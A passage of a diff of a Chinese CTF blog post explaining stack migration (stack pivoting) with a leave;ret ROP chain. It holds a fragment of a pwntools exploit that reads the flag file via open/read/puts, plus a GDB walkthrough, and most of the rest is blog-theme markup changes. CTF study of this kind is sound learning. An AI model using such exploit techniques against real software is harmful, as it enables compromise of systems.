-p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret)
-raw_input(&#39;-&gt;&#39;) #手动下一个断点，以后让gdb附加上进行调试
+io.recvuntil(&apos;\n&apos;)
+p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret)
+raw_input(&apos;-&gt;&apos;) #手动下一个断点，以后让gdb附加上进行调试
 io.send(p)
-flag = io.recvline_contains(&#39;hgame&#39;)
+flag = io.recvline_contains(&apos;hgame&apos;)
 print(flag)
-io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p>
+io.interactive()</code></pre></div><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p>
 <h3 id="Stack-Migration小总结"><a href="#Stack-Migration小总结" class="headerlink" title="Stack Migration小总结"></a>Stack Migration小总结</h3><p> 这下可以总结下利用思路也就是</p>
 <ul>
 <li>把控好起初栈的ebp，在里面写入需要伪造的new esp</li>
@@ -338,59 +379,79 @@ io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：
 <li>然后无限接ROP Chain</li>
 </ul>
 
+            </div>
             <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
-                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/学习记录/">学习记录</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Stack-Migration/">Stack Migration</a>
+                    
+                  </div>
                 
-                  <a class="hover-with-bg" href="/tags/Stack%20Migration">Stack Migration</a>
-                
-              </span>
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/11/Stack Migration题目练习/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Stack Migration题目练习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/02/03/ROP练习/">
+                        <span class="hidden-mobile">ROP题目练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
             
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
+          </article>
         </div>
       </div>
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<!-- custom -->
-
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
+      </div>
     
   </div>
 </div>
+
+<!-- Custom -->
+
 
     
   </main>
 
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
   
 
@@ -418,92 +479,100 @@ io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：
 </div>
   
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
   
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
-  
-  <br>
 
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
 <!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
-
-
-  
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
 <!-- Plugins -->
 
 
   
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
+    <script  src="/js/lazyload.js" ></script>
   
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
   </script>
 
 
 
-  <script src="/lib/typed/typed.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -523,11 +592,13 @@ io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：
 
 
 
-  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
   <script>
     anchors.options = {
-      placement: "right",
-      visible: "false",
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
       
     };
     var el = "h1,h2,h3,h4,h5,h6".split(",");
@@ -540,25 +611,27 @@ io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：
 
 
 
-  <script src="/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
   <script>
     var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
-      getSearchFile(path);
+      searchFunc(path, 'local-search-input', 'local-search-result');
       this.onclick = null
     }
   </script>
 
 
 
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
   <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
       function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
         $(this).wrap(element);
       }
     );
@@ -568,58 +641,24 @@ io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：
 
 
 
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
 
 
 
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
